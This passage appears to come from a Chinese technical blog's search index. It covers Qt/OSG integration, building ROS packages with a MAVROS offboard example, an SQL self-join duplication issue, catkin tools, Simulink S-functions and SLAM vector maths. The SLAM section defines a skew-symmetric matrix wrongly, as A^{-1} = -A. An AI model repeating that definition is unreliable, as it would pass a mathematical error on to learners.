<li><a href="https://cloud.tencent.com/developer/article/1705815" target="_blank" rel="noopener">通过QOpenGLWidget绘制三角形</a>,by 张诺谦.</li>
<li><a href="https://zhuanlan.zhihu.com/p/392967849" target="_blank" rel="noopener">QT中paintEvent事件的触发时间</a>,by 星辰大海.</li>
<li><a href="https://www.cnblogs.com/yjphhw/p/11070614.html" target="_blank" rel="noopener">QObject的timerEvent使用</a>,by 随便看看.</li>
<li><a href="https://blog.csdn.net/lusanshui/article/details/97638520" target="_blank" rel="noopener">Qt中QTimer和timerevent的区别与用法</a>,by lusanshui.</li>
<li><a href="https://blog.csdn.net/wzj0808/article/details/80517012" target="_blank" rel="noopener">Qt学习：子线程QThread的使用</a>,by 壁立千仞无欲则刚.</li>
<li><a href="https://www.cnblogs.com/ImagineMiracle-wxn/p/Qt_QMenuBar_IM_Shell.html" target="_blank" rel="noopener">Qt QMenuBar和QMenu以及QAction巧妙的使用方法</a>,by Imagine Miracle.</li>
<li><a href="https://blog.csdn.net/swartz_lubel/article/details/54985130" target="_blank" rel="noopener">qt中的菜单QMenu QAction</a>,by swartz_lubel.</li>
<li><a href="https://blog.51cto.com/u_15047489/4257148" target="_blank" rel="noopener">QWidget禁止最大化 </a>,by mb5fca0c87ea3a4.</li>
<li><a href="https://wiki.qt.io/How_to_use_QAbstractListModel" target="_blank" rel="noopener">How to use QAbstractListModel</a>,by wiki.qt.</li>
<li><a href="https://www.cnblogs.com/laiyingpeng/p/12485970.html" target="_blank" rel="noopener">VS2017 配置 Qt5.13 32位和64位版本开发环境问题报错《error LNK1112: 模块计算机类型“X86”与目标计算机类型“x64”冲突》</a>,by 灼光.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
        <tag>QT</tag>
      </tags>
  </entry>
  <entry>
    <title>QT集成OSG开发</title>
    <url>/2019/10/13/Qt%E9%9B%86%E6%88%90OSG%E5%BC%80%E5%8F%91/</url>
    <content><![CDATA[<p>Qt集成OSG开发是指使用Qt开发图形用户界面，封装OSG为Qt的Widget，然后由OSG负责三维展示的解决方案。具体方法如下：</p>
<h1 id="QT-OSG开发环境配置"><a href="#QT-OSG开发环境配置" class="headerlink" title="QT+OSG开发环境配置"></a>QT+OSG开发环境配置</h1><p>具体配置过程请参考<a href="https://huangwang.github.io/2019/10/10/Windows%E4%B8%8BQT%E4%B8%8EOSG%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">Windows下QT与OSG开发环境配置</a>。</p>
<h1 id="封装OSG为Widget"><a href="#封装OSG为Widget" class="headerlink" title="封装OSG为Widget"></a>封装OSG为Widget</h1><p>封装OSG为Widget可参考<a href="https://github.com/openscenegraph/osgQt" target="_blank" rel="noopener">osgQt</a>。osgQt的编译链接与OSG类似。</p>
<p>osgQt仅将OSG封装成简单的Widget，还需研究将OSG封装成自定义控件，从而在QT Designer里方便使用。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.w3xue.com/exp/article/20196/40679.html" target="_blank" rel="noopener">OSG嵌入QT的简明总结</a>,by charlee44.</li>
<li><a href="https://blog.csdn.net/niu2212035673/article/details/72802055" target="_blank" rel="noopener">OSG和Qt结合</a>,by 先锋小牛.</li>
<li><a href="https://blog.csdn.net/xpg4321/article/details/72867596" target="_blank" rel="noopener">OSG中使用Qt做界面</a>,by 很菜但努力.</li>
<li><a href="https://blog.csdn.net/u013207966/article/details/51531023" target="_blank" rel="noopener">第1课时《Qt osgEarth 编程入门》</a>,by 汀兰左岸.</li>
<li><a href="https://www.cnblogs.com/boright88/p/6264642.html" target="_blank" rel="noopener">QT pro文件解析</a>, by 博弈right.</li>
<li><a href="https://huangwang.github.io/2019/10/10/Windows%E4%B8%8BQT%E4%B8%8EOSG%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">Windows下QT与OSG开发环境配置</a>,by jackhuang.</li>
<li><a href="https://blog.csdn.net/q_l_s/article/details/52458240" target="_blank" rel="noopener">window下查看dll, lib文件是32位还是64位</a>,by 剑西楼.</li>
<li><a href="https://blog.csdn.net/only_1/article/details/80760495" target="_blank" rel="noopener">使用VS工具查看dll是32位还是64位</a>,by 代码运输员.</li>
<li><a href="https://blog.csdn.net/panshun888/article/details/51923927" target="_blank" rel="noopener">Qt自定义控件的创建与初步使用（一）之自定义控件的创建步骤</a>,by 穿过记忆的河流.</li>
<li><a href="https://blog.csdn.net/panshun888/article/details/52074400" target="_blank" rel="noopener">Qt自定义控件的创建与初步使用（二）之图片上绘制文字、箭头、曲线</a>,by 穿过记忆的河流.</li>
<li><a href="https://my.oschina.net/jannn/blog/466994" target="_blank" rel="noopener">QT自定义控件(生成和使用)</a>,by jannn.</li>
<li><a href="https://blog.csdn.net/xuzheng11332/article/details/61618955" target="_blank" rel="noopener">QT学习笔记（5）：自定义控件</a>,by xuzheng11332.</li>
<li><a href="https://blog.csdn.net/AleutianSix/article/details/88288721" target="_blank" rel="noopener">QT自定义控件在QTCreator中不显示问题</a>,by AleutianSix.</li>
<li><a href="https://blog.csdn.net/zhaoyuaiweide/article/details/75096412" target="_blank" rel="noopener">Qt中QObject QApplication Qwidget QDialog等等都是什么关系？？</a>,by 假如明天没有太阳.</li>
<li><a href="http://c.biancheng.net/view/1820.html" target="_blank" rel="noopener">Qt项目界面文件（.ui）及其作用（超详细）</a>,by C语言中文网.</li>
<li><a href="https://leiyiming.com/2017/04/12/qt5-vs/" target="_blank" rel="noopener">Qt5+VS2015开发之基础</a>,by Leiym Blog.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
        <tag>计算机仿真</tag>
        <tag>QT</tag>
      </tags>
  </entry>
  <entry>
    <title>ROS中Package安装方法</title>
    <url>/2019/06/08/ROS%E4%B8%ADPackage%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>ROS（机器人操作系统，Robot Operating System），是专为机器人软件开发所设计出来的一套电脑操作系统架构。它是一个开源的元级操作系统（后操作系统），提供类似于操作系统的服务，包括硬件抽象描述、底层驱动程序管理、共用功能的执行、程序间消息传递、程序发行包管理，它也提供一些工具和库用于获取、建立、编写和执行多机融合的程序。</p>
<p>ROS的Package资源非常丰富，官方库中就有两千多Package，这对扩充ROS的功能十分重要。下面即介绍ROS中Package的安装方法，主要分成两种方法：</p>
<h1 id="Deb安装方式"><a href="#Deb安装方式" class="headerlink" title="Deb安装方式"></a>Deb安装方式</h1><p>deb方式安装方法十分简单，根据ROS版本，直接运行apt-get命令，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install ros-kinetic-camera-calibration</span><br></pre></td></tr></table></figure>

<h1 id="源码安装方式"><a href="#源码安装方式" class="headerlink" title="源码安装方式"></a>源码安装方式</h1><p>源码安装方式稍微复杂，安装方法如下：</p>
<ol>
<li>创建catkin工作空间</li>
<li>在catkin工作空间的src文件夹下，下载ROS的Package源代码</li>
<li>使用catkin build命令编译安装</li>
</ol>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.zybuluo.com/ferstar/note/214495" target="_blank" rel="noopener">安装ROS软件包</a>,by ferstar.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>ROS</tag>
      </tags>
  </entry>
  <entry>
    <title>ROS构建Package和Node的教程</title>
    <url>/2019/05/15/ROS%E6%9E%84%E5%BB%BAPackage%E5%92%8CNode%E7%9A%84%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>ROS（机器人操作系统，Robot Operating System），是专为机器人软件开发所设计出来的一套电脑操作系统架构。它是一个开源的元级操作系统（后操作系统），提供类似于操作系统的服务，包括硬件抽象描述、底层驱动程序管理、共用功能的执行、程序间消息传递、程序发行包管理，它也提供一些工具和库用于获取、建立、编写和执行多机融合的程序。</p>
<p>ROS的运行架构是一种使用ROS通信模块实现模块间P2P的松耦合的网络连接的处理架构，它执行若干种类型的通讯，包括：</p>
<ul>
<li>基于服务的同步RPC（远程过程调用）通讯；</li>
<li>基于Topic的异步数据流通讯，还有参数服务器上的数据存储。</li>
</ul>
<p>ROS可与PX4一起用于飞行器的外部控制, 它使用MAVROS节点与在硬件上运行的PX4或使用Gazebo Simulator进行通信。MAVROS节点的安装请参考<a href="https://huangwang.github.io/2019/05/10/Ubuntu16-04%E5%AE%89%E8%A3%85MAVROS/">Ubuntu16.04安装MAVROS</a>，下面以编写基于MAVROS的外部控制节点为例，介绍ROS包和节点的构建过程。</p>
<h1 id="ROS包构建方法"><a href="#ROS包构建方法" class="headerlink" title="ROS包构建方法"></a>ROS包构建方法</h1><p>catkin和rosbuild是构建ROS包的两种方法。目前多用catkin构建ros包。</p>
<p>catkin包可以构建为独立项目，与构建普通cmake项目的方式相同，但catkin还提供了工作空间的概念，您可以在其中同时构建多个相互依赖的包。</p>
<h1 id="ROS包构成"><a href="#ROS包构成" class="headerlink" title="ROS包构成"></a>ROS包构成</h1><p>ROS包是其代码组织的一种高级结构好哦，最简单的catkin包的构成如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">my_package&#x2F;</span><br><span class="line">  CMakeLists.txt</span><br><span class="line">  package.xml</span><br></pre></td></tr></table></figure>

<p>其中:</p>
<ul>
<li>包必须包含一个符合catkin的package.xml文件。<ul>
<li>该package.xml文件提供有关包的元信息。</li>
</ul>
</li>
<li>包必须包含一个使用catkin的CMakeLists.txt。<ul>
<li>如果它是catkin元数据包，它必须具有相关的样板CMakeLists.txt文件。</li>
</ul>
</li>
<li>包都必须有自己的文件夹。<ul>
<li>这意味着没有嵌套包，也没有多个包共享同一目录。</li>
</ul>
</li>
</ul>
<h1 id="catkin工作空间的构成"><a href="#catkin工作空间的构成" class="headerlink" title="catkin工作空间的构成"></a>catkin工作空间的构成</h1><p>使用catkin软件包的推荐方法是使用catkin工作区，但您也可以独立构建catkin软件包。 一个简单的工作空间可能如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">workspace_folder&#x2F;        -- WORKSPACE</span><br><span class="line">  src&#x2F;                   -- SOURCE SPACE</span><br><span class="line">    CMakeLists.txt       -- &#39;Toplevel&#39; CMake file, provided by catkin</span><br><span class="line">    package_1&#x2F;</span><br><span class="line">      CMakeLists.txt     -- CMakeLists.txt file for package_1</span><br><span class="line">      package.xml        -- Package manifest for package_1</span><br><span class="line">    ...</span><br><span class="line">    package_n&#x2F;</span><br><span class="line">      CMakeLists.txt     -- CMakeLists.txt file for package_n</span><br><span class="line">      package.xml        -- Package manifest for package_n</span><br></pre></td></tr></table></figure>

<h1 id="创建catkin包"><a href="#创建catkin包" class="headerlink" title="创建catkin包"></a>创建catkin包</h1><p>通常使用catkin_create_pkg命令创建新的catkin包，具体步骤如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mkdir -p ~&#x2F;catkin_ws&#x2F;src</span><br><span class="line">$ cd ~&#x2F;catkin_ws&#x2F;src</span><br><span class="line"># 创建名为offboard的ros包，它依赖roscpp、mavros和geometry_msgs</span><br><span class="line">$ catkin_create_pkg offboard roscpp mavros geometry_msgs</span><br><span class="line">$ cd offboard&#x2F;src&#x2F;</span><br><span class="line"># 创建offboard_node.cpp，将官方PX4外部控制例程代码写入该文件</span><br><span class="line"># 该文件也是offboard包的第一个node</span><br><span class="line">$ touch offboard_node.cpp</span><br></pre></td></tr></table></figure>

<p>offboard_node.cpp文件的具体内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @file offb_node.cpp</span><br><span class="line"> * @brief Offboard control example node, written with MAVROS version 0.19.x, PX4 Pro Flight</span><br><span class="line"> * Stack and tested in Gazebo SITL</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">#include &lt;ros&#x2F;ros.h&gt;</span><br><span class="line">#include &lt;geometry_msgs&#x2F;PoseStamped.h&gt;</span><br><span class="line">#include &lt;mavros_msgs&#x2F;CommandBool.h&gt;</span><br><span class="line">#include &lt;mavros_msgs&#x2F;SetMode.h&gt;</span><br><span class="line">#include &lt;mavros_msgs&#x2F;State.h&gt;</span><br><span class="line"></span><br><span class="line">mavros_msgs::State current_state;</span><br><span class="line">void state_cb(const mavros_msgs::State::ConstPtr&amp; msg)&#123;</span><br><span class="line">    current_state &#x3D; *msg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">    ros::init(argc, argv, &quot;offb_node&quot;);</span><br><span class="line">    ros::NodeHandle nh;</span><br><span class="line"></span><br><span class="line">    ros::Subscriber state_sub &#x3D; nh.subscribe&lt;mavros_msgs::State&gt;</span><br><span class="line">            (&quot;mavros&#x2F;state&quot;, 10, state_cb);</span><br><span class="line">    ros::Publisher local_pos_pub &#x3D; nh.advertise&lt;geometry_msgs::PoseStamped&gt;</span><br><span class="line">            (&quot;mavros&#x2F;setpoint_position&#x2F;local&quot;, 10);</span><br><span class="line">    ros::ServiceClient arming_client &#x3D; nh.serviceClient&lt;mavros_msgs::CommandBool&gt;</span><br><span class="line">            (&quot;mavros&#x2F;cmd&#x2F;arming&quot;);</span><br><span class="line">    ros::ServiceClient set_mode_client &#x3D; nh.serviceClient&lt;mavros_msgs::SetMode&gt;</span><br><span class="line">            (&quot;mavros&#x2F;set_mode&quot;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;the setpoint publishing rate MUST be faster than 2Hz</span><br><span class="line">    ros::Rate rate(20.0);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; wait for FCU connection</span><br><span class="line">    while(ros::ok() &amp;&amp; !current_state.connected)&#123;</span><br><span class="line">        ros::spinOnce();</span><br><span class="line">        rate.sleep();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    geometry_msgs::PoseStamped pose;</span><br><span class="line">    pose.pose.position.x &#x3D; 0;</span><br><span class="line">    pose.pose.position.y &#x3D; 0;</span><br><span class="line">    pose.pose.position.z &#x3D; 2;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;send a few setpoints before starting</span><br><span class="line">    for(int i &#x3D; 100; ros::ok() &amp;&amp; i &gt; 0; --i)&#123;</span><br><span class="line">        local_pos_pub.publish(pose);</span><br><span class="line">        ros::spinOnce();</span><br><span class="line">        rate.sleep();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mavros_msgs::SetMode offb_set_mode;</span><br><span class="line">    offb_set_mode.request.custom_mode &#x3D; &quot;OFFBOARD&quot;;</span><br><span class="line"></span><br><span class="line">    mavros_msgs::CommandBool arm_cmd;</span><br><span class="line">    arm_cmd.request.value &#x3D; true;</span><br><span class="line"></span><br><span class="line">    ros::Time last_request &#x3D; ros::Time::now();</span><br><span class="line"></span><br><span class="line">    while(ros::ok())&#123;</span><br><span class="line">        if( current_state.mode !&#x3D; &quot;OFFBOARD&quot; &amp;&amp;</span><br><span class="line">            (ros::Time::now() - last_request &gt; ros::Duration(5.0)))&#123;</span><br><span class="line">            if( set_mode_client.call(offb_set_mode) &amp;&amp;</span><br><span class="line">                offb_set_mode.response.mode_sent)&#123;</span><br><span class="line">                ROS_INFO(&quot;Offboard enabled&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            last_request &#x3D; ros::Time::now();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            if( !current_state.armed &amp;&amp;</span><br><span class="line">                (ros::Time::now() - last_request &gt; ros::Duration(5.0)))&#123;</span><br><span class="line">                if( arming_client.call(arm_cmd) &amp;&amp;</span><br><span class="line">                    arm_cmd.response.success)&#123;</span><br><span class="line">                    ROS_INFO(&quot;Vehicle armed&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                last_request &#x3D; ros::Time::now();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        local_pos_pub.publish(pose);</span><br><span class="line"></span><br><span class="line">        ros::spinOnce();</span><br><span class="line">        rate.sleep();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>之后需要修改~/catkin_ws/src/offboard目录下的CMakeLists.txt文件。取消掉一些注释，生成相应节点（否则会出现找不到节点的错误）。</p>
<p align="center">
    <img src="images/cmakelists.png" width="90%" alt="修改CMakeLists.txt文件"/>
</p>

<h1 id="构建catkin包"><a href="#构建catkin包" class="headerlink" title="构建catkin包"></a>构建catkin包</h1><p>在catkin工作空间（catkin_ws）中，使用catkin_make工具从源文件构建和安装一个包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd ~&#x2F;catkin_ws</span><br><span class="line">$ catkin_make</span><br><span class="line">$ catkin_make install</span><br><span class="line"># 配置catkin工作空间，使ros能找到刚生成的offboard包</span><br><span class="line">$ source devel&#x2F;setup.bash</span><br><span class="line"># 查看ros包路径环境变量是否配置好</span><br><span class="line">$ echo $ROS_PACKAGE_PATH</span><br></pre></td></tr></table></figure>


<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://huangwang.github.io/2019/05/10/Ubuntu16-04%E5%AE%89%E8%A3%85MAVROS/">Ubuntu16.04安装MAVROS</a>,by jackhuang.</li>
<li><a href="http://wiki.ros.org/ROS/Tutorials/CreatingPackage" target="_blank" rel="noopener">Creating a ROS Package</a>, by ros homepage.</li>
<li><a href="http://wiki.ros.org/ROS/Tutorials/BuildingPackages" target="_blank" rel="noopener">Building a ROS Package</a>, by ros homepage.</li>
<li><a href="http://wiki.ros.org/ROS/Tutorials/UnderstandingNodes" target="_blank" rel="noopener">Understanding ROS Nodes</a>, by ros homepage.</li>
<li><a href="https://blog.csdn.net/chishuideyu/article/details/53581013" target="_blank" rel="noopener">catkin 与 rosbuild解析及两者区别和联系</a>,by Xuefeng_BUPT.</li>
<li><a href="https://blog.csdn.net/oqqENvY12/article/details/55263122" target="_blank" rel="noopener">Pixhawk原生固件PX4之SITL软件在环仿真</a>,by FantasyJXF.</li>
<li><a href="https://blog.csdn.net/oqqENvY12/article/details/77995192" target="_blank" rel="noopener">Pixhawk原生固件PX4之offboard</a>,by FantasyJXF.</li>
<li><a href="https://dev.px4.io/en/ros/mavros_offboard.html" target="_blank" rel="noopener">MAVROS Offboard control example</a>, by dronecode.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>PX4</tag>
        <tag>ROS</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL内连接结果集存在重复数据分析</title>
    <url>/2023/01/31/SQL%E5%86%85%E8%BF%9E%E6%8E%A5%E7%BB%93%E6%9E%9C%E9%9B%86%E5%AD%98%E5%9C%A8%E9%87%8D%E5%A4%8D%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>最近执行一条如下类似的SQL语句，结果却出现重复数据，分析了半天，最后才发现是：连接条件不唯一，导致结果集数据发生了重复。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 如果name字典重复n次，则将产生n*n条记录。</span><br><span class="line">select a.id,a.name from person as a inner join person as b on a.name&#x3D;b.name;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/qq_36135928/article/details/107066993" target="_blank" rel="noopener">sql连接查询存在结果集重复</a>,by ClareTung.</li>
<li><a href="https://zhuanlan.zhihu.com/p/46037197" target="_blank" rel="noopener">图解 SQL 中各种连接 JOIN</a>,by Moses.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>ROS编译命令catkin简析</title>
    <url>/2019/06/06/ROS%E7%BC%96%E8%AF%91%E5%91%BD%E4%BB%A4catkin%E7%AE%80%E6%9E%90/</url>
    <content><![CDATA[<p>目前编译ROS的Package有两种方法：</p>
<ul>
<li>catkin_make</li>
<li>catkin build</li>
</ul>
<h1 id="catkin-make"><a href="#catkin-make" class="headerlink" title="catkin_make"></a>catkin_make</h1><p>catkin_make 是一个命令行工具，它简化了catkin的标准工作流程。你可以认为catkin_make是在CMake标准工作流程中依次调用了cmake 和 make。</p>
<p>使用方法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 在catkin工作空间下</span><br><span class="line">$ catkin_make [make_targets] [-DCMAKE_VARIABLES&#x3D;...]</span><br></pre></td></tr></table></figure>

<h1 id="catkin"><a href="#catkin" class="headerlink" title="catkin"></a>catkin</h1><p>catkin是一个用于处理catkin元构建系统和catkin工作区的命令行工具。其用法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;catkin VERB -h&#96; for help on each verb listed below:</span><br><span class="line">  </span><br><span class="line">    build	Builds a catkin workspace.</span><br><span class="line">    clean	Deletes various products of the build verb.</span><br><span class="line">    config	Configures a catkin workspace&#39;s context.</span><br><span class="line">    create	Creates catkin workspace resources like packages.</span><br><span class="line">    env	        Run an arbitrary command in a modified environment. </span><br><span class="line">    init	Initializes a given folder as a catkin workspace.</span><br><span class="line">    list	Lists catkin packages in the workspace or other arbitray folders.</span><br><span class="line">    locate	Get the paths to various locations in a workspace.</span><br><span class="line">    profile	Manage config profiles for a catkin workspace.</span><br></pre></td></tr></table></figure>

<p>同样可使用catkin build命令编译ROS的package。</p>
<h1 id="catkin-make与catkin-build的区别"><a href="#catkin-make与catkin-build的区别" class="headerlink" title="catkin_make与catkin build的区别"></a>catkin_make与catkin build的区别</h1><p>与catkin_make不同，catkin命令行工具不仅仅是围绕cmake和make命令的瘦包装器。 catkin build命令隔离地在工作空间的源空间中构建每个包，以防止构建时串扰。 因此，在其最简单的用法中，catkin构建的行为类似于catkin_make_isolated的并行化版本。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://catkin-tools.readthedocs.io/en/latest/migration.html" target="_blank" rel="noopener">Migrating from catkin_make</a>,by catkin_tools homepage.</li>
<li><a href="http://wiki.ros.org/cn/ROS/Tutorials/BuildingPackages" target="_blank" rel="noopener">编译ROS程序包</a>,by ros wiki.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>ROS</tag>
      </tags>
  </entry>
  <entry>
    <title>Simulink中S函数的使用方法</title>
    <url>/2020/04/06/Simulink%E4%B8%ADS%E5%87%BD%E6%95%B0%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<blockquote>
<p>Simulink是The MathWorks公司开发的用于动态系统和嵌入式系统的多领域模拟和基于模型的设计工具，常集成于MathWorks公司的另一产品MATLAB中与之配合使用。</p>
</blockquote>
<blockquote>
<p>S-函数是系统函数（System Function）的简称，在Simulink中用非图形化的方式来描述一个模块。一个完整的S-函数结构体系包含了描述一个动态系统所需要的全部能力。使用S-函数用户可以向Simulink模型中添加自己的模块，可以自由选择使用MATLAB、C、C++等语言来创建自己的模块。</p>
</blockquote>
<h1 id="编写S函数"><a href="#编写S函数" class="headerlink" title="编写S函数"></a>编写S函数</h1><p>编写S函数，可以从 Matlab 给的模板S函数文件开始，用户可以在 Matlab 命令窗口中键入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">edit sfuntmpl</span><br></pre></td></tr></table></figure>

<p>该模板S函数文件包含了所有的S函数的例程， 包含1个主函数和6个子函数。 在主函数程序使用一个多分支语句 （Switch－case）根据标志将执行流程转移到相应的例程函数。主函数的参数 Flag 标志值是由系统（Simulink 引擎）调用时给出的。</p>
<h1 id="问题处理"><a href="#问题处理" class="headerlink" title="问题处理"></a>问题处理</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/23301801" target="_blank" rel="noopener">Simulink之——S函数</a>,by 只是学电的.</li>
<li><a href="http://218.93.127.64/thread-506088-1-1.html" target="_blank" rel="noopener">使用level2 M S函数时，设置了0输入就会报错，测试程序见贴</a>,by yfspring.</li>
<li><a href="http://wtclab.net/txfz/jkmulu.html" target="_blank" rel="noopener">MATLAB / SIMULINK通信系统建模与仿真实例分析</a>,by 邵玉斌.</li>
<li><a href="https://www.cnblogs.com/ichbinhere/p/12834511.html" target="_blank" rel="noopener">Level2-S-function</a>,by auto6329.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>Simulink仿真视频教程记录</title>
    <url>/2020/11/06/Simulink%E4%BB%BF%E7%9C%9F%E8%A7%86%E9%A2%91%E6%95%99%E7%A8%8B%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>看了吴菁老师的几个Simulink教学视频，很不错，记录一下。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.mathworks.com/videos/modeling-and-simulation-made-easy-with-simulink-and-stateflow-102312.html" target="_blank" rel="noopener">使用Simulink和Stateflow快速实现飞行器的设计仿真</a>,by 吴菁.</li>
<li><a href="https://www.mathworks.com/videos/using-simulink-and-stateflow-to-complete-modeling-simulation-and-flight-control-design-100948.html" target="_blank" rel="noopener">使用Simulink 和Stateflow完成建模、仿真和飞行控制设计</a>,by 吴菁.</li>
<li><a href="https://www.mathworks.com/videos/control-system-development-made-easier-82534.html" target="_blank" rel="noopener">使用 MATLAB 和 Simulink 让控制系统的开发更轻松</a>,by 吴菁.</li>
<li><a href="https://www.mathworks.com/videos/quadcopter-simulation-and-control-made-easy-116297.html" target="_blank" rel="noopener">四旋翼飞行器的建模仿真和控制</a>,by 吴菁.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>SLAM中位姿估计的数学基础</title>
    <url>/2019/05/20/SLAM%E4%B8%AD%E4%BD%8D%E5%A7%BF%E4%BC%B0%E8%AE%A1%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>同步定位与地图构建（SLAM或Simultaneous localization and mapping）是一种概念：希望机器人从未知环境的未知地点出发，在运动过程中通过重复观测到的地图特征（比如，墙角，柱子等）定位自身位置和姿态，再根据自身位置增量式的构建地图，从而达到同时定位和地图构建的目的。</p>
<p>SLAM的核心工作有两个：</p>
<ul>
<li>地图构建</li>
</ul>
<p>研究如何把从一系列传感器收集到的信息，集成到一个一致性的模型上的问题。它可以被描述为第一核心问题：这个世界长什么样？地图构建的核心部分是环境的表达方式以及传感器数据的解释。</p>
<ul>
<li>定位</li>
</ul>
<p>研究在地图上估测机器人的坐标和姿势形态的问题；换而言之，机器人需要回答这里的第二核心问题，我在哪？典型的解包含以下两个方面：追踪——通常机器人的初始位置已知；全局定位——通常只给出很少，甚至不给出有关于起始位置环境特征的先验信息。</p>
<p>下面主要介绍SLAM定位研究中涉及的数学知识。</p>
<h1 id="向量点积"><a href="#向量点积" class="headerlink" title="向量点积"></a>向量点积</h1><p>有如下两个向量:</p>
<p>$$a=\begin{pmatrix}<br>a_{1}\<br>a_{2}\<br>a_{3}<br>\end{pmatrix},b=\begin{pmatrix}<br>b_{1}\<br>b_{2}\<br>b_{3}<br>\end{pmatrix}$$</p>
<p>它们的点乘定义如下：</p>
<p>$$a\cdot b=a^{T}\cdot b = \sum_{i=1}^{3}a_{i}b_{i}=\left | a \right |\left | b \right |cos&lt;a,b&gt;$$</p>
<p>即两个向量点乘等于一个向量的转置乘以另一个向量。</p>
<h1 id="向量叉积"><a href="#向量叉积" class="headerlink" title="向量叉积"></a>向量叉积</h1><p>两个向量做叉积结果还是一个向量，这个向量垂直于这两个做叉积的向量所组成的平面。</p>
<p>$$<br>a\times b=\begin{vmatrix}<br>i &amp; j &amp; k\<br>a_{1} &amp; a_{2} &amp; a_{3}\<br>b_{1} &amp; b_{2} &amp; b_{3}<br>\end{vmatrix}=(a_{2}b_{3}-a_{3}b_{2})i+(a_{3}b_{1}-a_{1}b_{3})j+(a_{1}b_{2}-a_{2}b_{1})k $$</p>
<p>为了计算方便，将两个向量写成行列式的形式，然后按对角线法则计算行列式的值。i、j、k分量分别即代表x、y、z轴方向的分量。写成列向量的形式如下:</p>
<p>$$<br>\begin{pmatrix}<br>a_{2}b_{3}-a_{3}b_{2}\<br>a_{3}b_{1}-a_{1}b_{3}\<br>a_{1}b_{2}-a_{2}b_{1}<br>\end{pmatrix}=\begin{pmatrix}<br>0\cdot b_{1}-a_{3}b_{2}+a_{2}b_{3}\<br>a_{3}b_{1}-0\cdot b_{2}-a_{1}b_{3}\<br>-a{2}b_{1}+a_{1}b_{2}+0\cdot b_{3}<br>\end{pmatrix}=\begin{pmatrix}<br>0 &amp; -a_{3} &amp; a_{2}\<br>a_{3} &amp; 0 &amp; -a_{1}\<br>-a_{2} &amp; a_{1} &amp; 0<br>\end{pmatrix}\begin{pmatrix}<br>b_{1}\<br>b_{2}\<br>b_{3}<br>\end{pmatrix} $$</p>
<p>再将其写成与b相乘的矩阵形式，提取系数矩阵。这个系数矩阵就称作向量a的反对称矩阵，用a^记。所谓反对称矩阵，是指满足下面这个条件的矩阵。</p>
<p>$$A^{-1}=-A$$</p>
<p>因为向量叉积的结果是一个向量，因此可以用来表示旋转，结果向量的方向为旋转轴，大小为旋转角。结果可以看作一个旋转向量。</p>
